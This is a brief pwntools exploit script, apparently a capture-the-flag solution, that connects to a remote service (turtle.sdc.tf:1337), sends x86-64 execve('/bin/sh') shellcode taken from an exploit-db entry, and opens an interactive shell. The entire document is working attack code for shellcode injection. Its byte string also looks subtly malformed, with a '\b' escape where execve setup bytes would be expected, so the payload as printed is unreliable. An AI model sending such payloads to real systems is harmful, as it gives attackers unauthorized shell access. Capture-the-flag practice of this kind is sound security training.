from pwn import *

r = remote("turtle.sdc.tf", 1337)

print(r.recvuntil(b'shell\n'))

# https://www.exploit-db.com/exploits/42179
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\b\x58\x99\x0f\x05"

payload = shellcode

r.sendline(payload)
r.interactive()